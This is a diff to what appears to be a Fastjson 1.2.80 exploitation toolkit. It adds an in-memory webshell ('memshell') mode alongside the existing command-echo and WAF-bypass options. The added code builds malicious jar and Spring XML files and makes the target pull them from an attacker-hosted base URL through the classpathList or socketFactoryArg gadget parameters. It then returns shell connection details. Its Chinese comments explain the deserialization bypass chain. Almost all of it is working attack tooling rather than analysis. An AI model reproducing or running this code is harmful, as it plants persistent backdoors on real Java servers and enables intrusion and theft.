@@ -17,6 +17,12 @@ from fastjson_toolkit.poc.echo import (
     supports_1280_echo,
 )
 from fastjson_toolkit.poc.getter import wrap_with_currency
+from fastjson_toolkit.poc.memshell import (
+    build_memshell_delivery,
+    generate_memshell,
+    supports_1280_memshell,
+    write_spring_memshell_attack_files,
+)
 from fastjson_toolkit.poc.v1_2_80.catalog import get_gadget, list_gadgets
 from fastjson_toolkit.poc.v1_2_80.models import (
     Poc1280GenerateOptions,
@@ -28,7 +34,8 @@ from fastjson_toolkit.poc.v1_2_80.payloads import DEFAULT_ATTACK_BASE, build_ste
 from fastjson_toolkit.waf import apply_waf_payloads
 
 COMMON_NOTES = [
-    "RCE 证明：默认写文件（/tmp/fj1280_<gadget>）；开启 echo 时改为命令回显。",
+    "RCE 证明：默认写文件（/tmp/fj1280_<gadget>）；开启 echo 时改为命令回显；"
+    "开启 memshell 时注入内存马（与 echo 互斥）。",
     "原理：双 @type 以 java.lang.Exception 作 expectClass，"
     "ThrowableDeserializer.cast → ParserConfig.getDeserializer 缓存字段类型后恢复利用类。",
     "1.2.83 起对 Throwable 子类从 mapping 取出后清空，本链失效。",
@@ -120,6 +127,87 @@ def _prepare_echo_assets(
     return xml_url, None, jar_b64, xml_b64, notes
 
 
+def _prepare_memshell_assets(
+    gadget: str,
+    *,
+    ms_api: str,
+    ms_server: str,
+    ms_tool: str,
+    ms_type: str,
+    ms_path: str,
+    ms_jdk: str,
+    attack_base: str,
+) -> tuple[
+    str | None,
+    str | None,
+    Optional[str],
+    Optional[str],
+    dict,
+    str,
+    list[str],
+]:
+    """返回 (socket_arg, classpath, jar_b64, xml_b64, info, connect, notes)。"""
+    base = attack_base.rstrip("/")
+    notes: list[str] = []
+    ms = generate_memshell(
+        backend=ms_api,
+        server=ms_server,
+        tool=ms_tool,
+        shell_type=ms_type,
+        url_pattern=ms_path,
+        jdk=ms_jdk,
+        static_initialize=False,
+    )
+    info = ms.as_info_dict()
+    connect = ms.connect_info
+
+    if gadget == "groovy":
+        delivery = build_memshell_delivery(
+            ms, jar_url=f"{base}/memshell.jar", include_groovy=True
+        )
+        if not delivery.groovy_jar_bytes:
+            raise RuntimeError("Groovy 内存马 jar 生成失败")
+        jar_b64 = base64.b64encode(delivery.groovy_jar_bytes).decode("ascii")
+        out = _LAB_ATTACK / "evil-memshell.jar"
+        try:
+            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
+            out.write_bytes(delivery.groovy_jar_bytes)
+            notes.append(f"已写入本地 {out}")
+        except OSError:
+            notes.append(
+                "无法写入 lab attack 目录；请自行托管 evil-memshell.jar（见 attack_jar_b64）"
+            )
+        classpath = f"{base}/evil-memshell.jar"
+        notes.extend(delivery.notes)
+        notes.append(
+            f"Groovy 内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
+            f"classpathList → {classpath}"
+        )
+        notes.append("连接信息：\n" + connect)
+        return None, classpath, jar_b64, None, info, connect, notes
+
+    jar_url = f"{base}/memshell.jar"
+    delivery = build_memshell_delivery(ms, jar_url=jar_url)
+    jar_b64 = base64.b64encode(delivery.jar_bytes).decode("ascii")
+    xml_b64 = base64.b64encode(delivery.spring_xml_bytes).decode("ascii")
+    try:
+        write_notes = write_spring_memshell_attack_files(_LAB_ATTACK, delivery)
+        notes.extend(write_notes)
+    except OSError:
+        notes.append(
+            "无法写入 lab attack 目录；请托管 memshell.jar + bean-memshell.xml"
+            "（见 attack_*_b64）"
+        )
+    xml_url = f"{base}/bean-memshell.xml"
+    notes.extend(delivery.notes)
+    notes.append(
+        f"Spring XML 内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
+        f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
+    )
+    notes.append("连接信息：\n" + connect)
+    return xml_url, None, jar_b64, xml_b64, info, connect, notes
+
+
 def generate_poc_1280(
     options: Optional[Poc1280GenerateOptions] = None,
 ) -> Poc1280GenerateResult:
@@ -128,14 +216,46 @@ def generate_poc_1280(
 
     socket_arg = opts.socket_factory_arg
     classpath = opts.classpath
-    echo_on = bool(opts.echo)
+    memshell_on = bool(opts.memshell)
+    echo_on = bool(opts.echo) and not memshell_on
     engine = ""
     cmd_header = ""
     jar_b64: Optional[str] = None
     xml_b64: Optional[str] = None
+    memshell_info: Optional[dict] = None
+    memshell_connect: Optional[str] = None
     extra_notes: list[str] = []
 
-    if echo_on:
+    if memshell_on:
+        if opts.echo:
+            extra_notes.append("memshell 与 echo 互斥，已优先内存马模式")
+        if not supports_1280_memshell(entry.id):
+            raise ValueError(
+                f"gadget={entry.id} 不支持内存马；"
+                "请选用 postgresql / jython / groovy"
+            )
+        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        (
+            socket_arg,
+            classpath,
+            jar_b64,
+            xml_b64,
+            memshell_info,
+            memshell_connect,
+            extra_notes_ms,
+        ) = _prepare_memshell_assets(
+            entry.id,
+            ms_api=opts.ms_api,
+            ms_server=opts.ms_server,
+            ms_tool=opts.ms_tool,
+            ms_type=opts.ms_type,
+            ms_path=opts.ms_path,
+            ms_jdk=opts.ms_jdk,
+            attack_base=attack_base,
+        )
+        extra_notes.extend(extra_notes_ms)
+
+    elif echo_on:
         if not supports_1280_echo(entry.id):
             raise ValueError(
                 f"gadget={entry.id} 不支持命令回显；"
@@ -177,7 +297,7 @@ def generate_poc_1280(
     notes.extend(extra_notes)
     if entry.steps > 1:
         notes.append(f"本 gadget 共 {len(steps)} 步，请按 steps 顺序发送。")
-    if not echo_on:
+    if not echo_on and not memshell_on:
         notes.append(f"写文件证明：{entry.marker_file} ← {entry.marker_content!r}")
     if opts.wrap_currency:
         notes.append(
@@ -202,6 +322,9 @@ def generate_poc_1280(
         cmd_header=cmd_header,
         attack_jar_b64=jar_b64,
         attack_xml_b64=xml_b64,
+        memshell=memshell_on,
+        memshell_info=memshell_info,
+        memshell_connect=memshell_connect,
     )
 
 
@@ -227,6 +350,8 @@ def run_poc_1280(
         summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
     if gen.echo:
         summary += f"；echo={gen.engine} header={gen.cmd_header}"
+    if gen.memshell:
+        summary += "；memshell=on"
     result = Poc1280SendResult(
         ok=True,
         gadget=gen.gadget,
@@ -247,6 +372,9 @@ def run_poc_1280(
         cmd_header=gen.cmd_header,
         attack_jar_b64=gen.attack_jar_b64,
         attack_xml_b64=gen.attack_xml_b64,
+        memshell=gen.memshell,
+        memshell_info=gen.memshell_info,
+        memshell_connect=gen.memshell_connect,
     )
     if not opts.send:
         return result
